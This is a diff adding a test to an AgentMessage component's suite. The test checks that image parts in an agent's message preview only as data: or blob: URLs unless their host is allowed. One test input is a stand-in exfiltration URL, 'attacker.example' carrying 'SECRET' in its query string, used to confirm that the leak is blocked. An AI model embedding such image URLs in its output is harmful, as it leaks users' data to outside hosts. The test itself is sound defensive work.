@@ -146,6 +146,27 @@ describe('AgentMessage', () => {
     ]);
   });
 
+  it('previews image files under the same policy: data: and blob: URLs always, others when allowed', async () => {
+    const file = (url: string, filename: string) => ({ type: 'file' as const, mediaType: 'image/png', url, filename });
+    const parts: UIMessage['parts'] = [
+      file('data:image/png;base64,iVBORw0KGgo=', 'upload.png'),
+      file('blob:https://app.test/5b1c', 'pasted.png'),
+      file('https://attacker.example/p.png?d=SECRET', 'chart.png'),
+      file('/uploads/logo.png', 'logo.png'),
+    ];
+    const { container, rerender } = render(<AgentMessage message={assistant(parts)} />);
+    const sources = () => [...container.querySelectorAll('img')].map((img) => img.getAttribute('src'));
+    expect(sources()).toEqual(['data:image/png;base64,iVBORw0KGgo=', 'blob:https://app.test/5b1c']);
+    const blocked = screen.getByRole('link', { name: /chart\.png/ });
+    expect(blocked).toHaveAttribute('href', 'https://attacker.example/p.png?d=SECRET');
+    expect(blocked.querySelector('img')).toBeNull();
+    expect(screen.getByRole('link', { name: /logo\.png/ }).querySelector('img')).toBeNull();
+    expect(await axe(container)).toHaveNoViolations();
+
+    rerender(<AgentMessage message={assistant(parts)} allowedImageHosts={['attacker.example', 'self']} />);
+    expect(sources()).toEqual(parts.map((p) => (p as { url: string }).url));
+  });
+
   it('has no axe violations', async () => {
     const { container } = render(<AgentMessage message={message} onToolApproval={() => {}} />);
     expect(await axe(container)).toHaveNoViolations();
